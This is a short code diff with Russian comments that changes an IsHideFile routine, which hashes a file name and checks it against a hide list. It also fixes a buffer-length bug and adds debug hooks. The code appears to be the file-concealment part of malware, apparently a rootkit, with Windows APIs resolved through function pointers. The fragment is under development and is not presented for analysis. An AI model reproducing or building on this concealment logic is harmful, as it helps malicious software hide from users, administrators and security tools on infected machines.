@@ -256,19 +256,29 @@ BOOL IsHide( DWORD dwFileHash )
 }
 //----------------------------------------------------------------------------
 
-BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen)
+BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
 {
 	//  Функция возвращает истину, если необходимо спрятать
 	//  указанный файл
+	//
+	// ControlPoint - Информация для отладки
+
+	int Len = FileNameLen / sizeof(WCHAR); // функции передаётся размер буфера а не длина строки
 
 	if (FileName == NULL || FileNameLen == 0)
 		return FALSE;
 
 	// Определяем хэш файла
-	DWORD Hash = WSTR::GetHash(FileName, FileNameLen, false);
+	DWORD Hash = STRW::Hash(FileName, Len, false);
+
+//	wstring Str;
+//	Str.Format(L"1---%d----- %s", ControlPoint, FileName);
+//	pOutputDebugStringW(Str.t_str());
 
 	// Проверяем хэш
-	return IsHide(Hash);
+	BOOL Hide = IsHide(Hash);
+
+	return Hide;
 }
 //----------------------------------------------------------------------------
 
